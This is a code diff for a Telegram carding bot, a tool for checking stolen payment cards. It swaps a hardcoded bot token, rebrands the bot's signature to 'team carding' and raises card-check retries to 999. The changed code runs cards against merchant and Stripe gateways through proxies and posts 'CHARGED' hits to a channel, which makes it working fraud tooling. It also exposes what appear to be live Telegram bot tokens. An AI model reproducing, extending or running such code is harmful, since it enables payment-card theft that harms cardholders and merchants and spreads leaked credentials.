@@ -25,7 +25,7 @@ def get_bot_token():
                     return token
     except:
         pass
-    return '8896219003:AAFsKSriA2IBT0Gkz1FdDwALtUuP8QQUEuw'  # default
+    return '8569906031:AAHMIRME8pl1QxBmXVK_0d5XDJzJcVQ5U5w'  # default
 
 BOT_TOKEN = get_bot_token()
 
@@ -666,7 +666,7 @@ async def send_hit_to_channel(card, status, response, gateway, price, user_id=No
 {price_emoji} Price {price}
 {ti_emoji} {time_str}
 {mention}
-{dk_emoji} <b><a href='tg://user?id=8987165792'>Darkanons</a></b>"""
+{dk_emoji} <b><a href='tg://user?id=8987165792'>𝘁𝗲𝗮𝗺 𝗰𝗮𝗿𝗱𝗶𝗻𝗴</a></b>"""
         sent_msg = await bot.send_message(abs(HITS_CHANNEL_ID), msg, parse_mode='html')
         if should_pin:
             try:
@@ -742,7 +742,7 @@ RETRY_RESPONSES = [
     'out of stock', 'login required', 'access denied', 'tokenization_failed'
 ]
 
-async def check_card_with_retry(card, sites, proxies, max_retries=20):
+async def check_card_with_retry(card, sites, proxies, max_retries=999):
     if not sites:
         return {'status': 'Declined', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
     if not proxies:
@@ -767,7 +767,7 @@ async def check_card_with_retry(card, sites, proxies, max_retries=20):
         
         return result
     
-    return {'status': 'Declined', 'message': 'Max retries reached', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
+    return {'status': 'Declined', 'message': 'All sites exhausted', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
 
 # ===================== STRIPE CHARGE CHECKER =====================
 async def check_card_stripe_charge(card, proxy=None, site=None):
@@ -1142,7 +1142,7 @@ async def start_mass_check(user_id, cards, sites, event):
                 current_proxies = get_user_proxies(user_id)
                 if not current_sites or not current_proxies:
                     break
-                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=20)
+                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=999)
                 all_results['checked'] += 1
                 all_results['last_card'] = card
                 all_results['last_response'] = res.get('message', '')[:50]
@@ -1892,7 +1892,7 @@ async def single_cc_check(event):
     card = cards[0]
     status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ <code>{card}</code>..."), parse_mode='html')
     try:
-        result = await check_card_with_retry(card, sites, proxies, max_retries=20)
+        result = await check_card_with_retry(card, sites, proxies, max_retries=999)
         brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
         if result['status'] == 'Charged':
             status_header = premium_emoji('💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥')
